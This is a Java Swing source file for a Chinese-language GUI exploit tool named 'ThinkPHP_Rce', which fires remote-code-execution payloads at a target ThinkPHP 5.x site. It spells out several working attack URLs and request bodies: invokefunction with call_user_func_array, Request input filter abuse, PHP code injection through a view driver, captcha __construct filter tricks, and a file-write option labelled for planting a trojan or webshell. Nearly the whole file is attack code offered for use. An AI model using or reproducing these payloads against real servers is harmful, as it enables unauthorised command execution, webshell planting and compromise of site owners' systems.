package GuiManager;

import HttpURLConnectionExample.*;
import com.sun.xml.internal.ws.message.PayloadElementSniffer;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @program: ThinkPHP_Rce
 * @description:
 * @author: Mr.Wang
 * @create: 2022-05-12 02:06
 **/
public class Gui {
    private JPanel root;
    private JTabbedPane tabbedPane1;
    private JComboBox comboBox1;
    private JComboBox comboBox2;
    private JButton 利用Button;
    private JButton 扫描Button;
    private JTextField filenameText;
    private JTabbedPane tabbedPane2;
    private JTextArea textArea1;
    private JTextField textField1;
    private JPanel browerobject;
    private JScrollPane browerobjectsp;
    private JEditorPane jEditorPane;
    private JTextField phpinfoTextField1;
    private JButton 清空Button;
    private JLabel payload;
    private JTextField textField2;
    public String RequestRet="";
    public HashMap<String, ArrayList<String>> VulnList;
    public Gui() {
        comboBox1.addItem("ThinkPHP 5.x");
        VulnArrayList();
        URL url= null;
        ChiosFramework();
        //漏洞框架 ,
        //private static WebBrowser browser;
        textArea1.setText("登DUA郎 漏洞利用工具 v1.0.1。\n目前版本只支持部分ThinkPHP漏洞的复现，并未完善。\n 本工具做得比较水，目标是能用就行，目前发布第一个版本有什么问题可以多多指教。");
        利用Button.addActionListener(new ActionListener() {
            String Url="";

            @Override
            public void actionPerformed(ActionEvent e) {
                if (comboBox1.getSelectedItem().toString().equals("ThinkPHP 5.x")){
                    ThinkPHPRceExploit();
            }
            }




        });
        清空Button.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                textArea1.setText("");
            }
        });
    }


    public void ChiosFramework(){
        for (int i = 0; i < VulnList.get(comboBox1.getSelectedItem().toString()).size(); i++) {
            System.out.println(VulnList.get(comboBox1.getSelectedItem().toString()).get(i));
            comboBox2.addItem(VulnList.get(comboBox1.getSelectedItem().toString()).get(i));
        }
    }
    public void VulnArrayList(){
        VulnList=new HashMap<String,ArrayList<String>>();
        VulnList.put("ThinkPHP 5.x",new ArrayList<String>());
        VulnList.get("ThinkPHP 5.x").add("第一种 5.1.x RCE");
        VulnList.get("ThinkPHP 5.x").add("第二种 5.1.x");
        VulnList.get("ThinkPHP 5.x").add("第三种 5.1.x 写木马");
        VulnList.get("ThinkPHP 5.x").add("第四种 5.1.x RCE");
        VulnList.get("ThinkPHP 5.x").add("第六种 5.x RCE");
        VulnList.get("ThinkPHP 5.x").add("第七种 5.x RCE");
        VulnList.get("ThinkPHP 5.x").add("第八种 5.x RCE");

    }
    private String GetChionsVuln(){
        return comboBox2.getSelectedItem().toString();
    }

    public void browersethtml(String HtmlCode){
        LayoutManager layout = new FlowLayout();
        browerobject.setLayout(layout);
        jEditorPane.setEditable(true);
        URL url= null;

        jEditorPane.setContentType("text/html");
        jEditorPane.setText(HtmlCode);

    }
    private String GetUrl(String Url){
        return textField1.getText().toString() +Url;
    }


    private String SendRequest(String Url,String RequestType,String PostData,String Cookie,String UserAgent){
        if(RequestType.equals("GET")){
            return HttpRequest.get(Url,true).send(PostData).body();

        }
        else if(RequestType.equals("POST"))
        {
            return HttpRequest.post(Url,true).send(PostData).body();
        }

        return "";
    }

    public void ThinkPHPRceExploit(){
        String Url=textField1.getText().toString();
        if(GetChionsVuln().equals("第一种 5.1.x RCE")){

            //textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                Url= GetUrl("/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1");
            }else{
                Url= GetUrl("/index.php?s=index/\\think\\Request/input&filter="+textField2.getText()+"&data="+ phpinfoTextField1.getText().toString());
            }

            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                RequestRet="";
            }

        }else if(GetChionsVuln().equals("第二种 5.1.x")){
            String Payload= "/index.php?s=index/\\think\\view\\driver\\Php/display&content=<?php "+ phpinfoTextField1.getText()+"?>";
            Url= GetUrl(Payload);
            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                RequestRet="";
            }
        }else if(GetChionsVuln().equals("第三种 5.1.x 写木马")){
            String Payload= "/index.php??s=index/\\think\\template\\driver\\file/write&cacheFile="+ filenameText.getText()+"&content="+ phpinfoTextField1.getText();
            Url= GetUrl(Payload);
            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                RequestRet="";
            }
        }else if(GetChionsVuln().equals("第四种 5.1.x RCE")){
            //textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
            if(phpinfoTextField1.getText().equals("phpinfo();")) {
                Url= GetUrl("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1");
            }else{
                Url= GetUrl("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]="+textField2.getText()+"&vars[1][]="+ phpinfoTextField1.getText().toString());

            }

            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                RequestRet="";
            }
        }else if(GetChionsVuln().equals("第五种 5.1.x RCE")){
            textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
            if(filenameText.getText().equals("phpinfo();")) {
                Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1");
            }else{
                Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]="+textField2.getText()+"&vars[1][]="+ phpinfoTextField1.getText().toString());
            }

            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                RequestRet="";
            }
        }else if(GetChionsVuln().equals("第六种 5.1.x RCE")){
            textArea1.append("此漏洞不支持 执行php形式payload，要是执行命令，请直接在pyload里输入命令即可。要是执行phpinfo();，输入phpinfo();即可。\n");
            if(filenameText.getText().equals("phpinfo();")) {
                Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1");
            }else{
                Url= GetUrl("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]="+textField2.getText()+"&vars[1][]="+ phpinfoTextField1.getText().toString());
            }

            try{
                RequestRet= SendRequest(Url,"GET","","","");
            }catch (Exception error){
                error.printStackTrace();
                RequestRet="";
            }
        }else if(GetChionsVuln().equals("第七种 5.x RCE")){
            String Payload;
            Url=GetUrl("/index.php?s=captcha");
            if(filenameText.getText().equals("phpinfo();")) {
                Payload = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=-1";
            }else{
                Payload = "_method=__construct&filter[]="+textField2.getText()+"&method=get&server[REQUEST_METHOD]="+phpinfoTextField1.getText();
            }
            try{
                RequestRet= SendRequest(Url,"GET",Payload,"","");
            }catch (Exception error){
                error.printStackTrace();
                RequestRet="";
            }

        }else if(GetChionsVuln().equals("第八种 5.x RCE")){
            String Payload;
            Url=GetUrl("/index.php?s=captcha");
            if(filenameText.getText().equals("phpinfo();")) {
                Payload = "_method=__construct&method=get&filter[]=phpinfo&get[]=-1";
            }else{
                Payload = "_method=__construct&method=get&filter[]="+textField2.getText()+"&get[]="+phpinfoTextField1.getText();
            }
            try{
                RequestRet= SendRequest(Url,"GET",Payload,"","");
            }catch (Exception error){
                error.printStackTrace();
                RequestRet="";
            }

        }


        browersethtml(RequestRet);
        textArea1.append(RequestRet+"\n");
        textArea1.append(" Url:"+Url+"\n");
        textArea1.append("==========================================================================\n");

    }

    public static void GuiMain() {
        JFrame frame = new JFrame("登Dua郎漏洞利用工具 By:Rumsfed 3he11");
        frame.setContentPane(new Gui().root);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.pack();
        frame.setSize(1200,500);
        frame.setVisible(true);
    }
}
